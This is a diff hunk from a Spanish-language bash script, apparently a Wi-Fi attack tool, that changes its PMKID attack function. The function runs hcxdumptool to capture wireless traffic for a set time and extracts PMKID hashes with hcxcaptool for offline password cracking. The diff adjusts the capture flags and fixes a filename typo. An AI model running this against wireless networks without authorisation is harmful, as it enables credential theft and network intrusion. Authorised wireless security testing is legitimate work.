@@ -194,11 +194,11 @@ pkmid_ataque() {
 	echo -e "${blueColour}[!]$grayColour Recomendacion: 600 segundos (10 minutos)"
 	echo -ne "$purpleColour[?]$grayColour Cuantos segundos quieres que dure la captura de los paquetes?: " && read seg
 	$cleancolor
-	xterm -hold -e "hcxdumptool -i $tar --enable_status=1 -o Captura" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
+	xterm -hold -e "hcxdumptool -i $tar -o Captura --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
 	hcxdumptool_PID=$!
 	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
     echo -e "\n${redColour}[%]$grayColour Capturando Hashes\n"
-	hcxcaptool -z HASHPMKID Captura; sudo rm Capruta 2>/dev/null
+	hcxcaptool -z HASHPMKID Captura; sudo rm Captura 2>/dev/null
 	sleep 1
 	$cleancolor
 	test -f HASHPMKID*
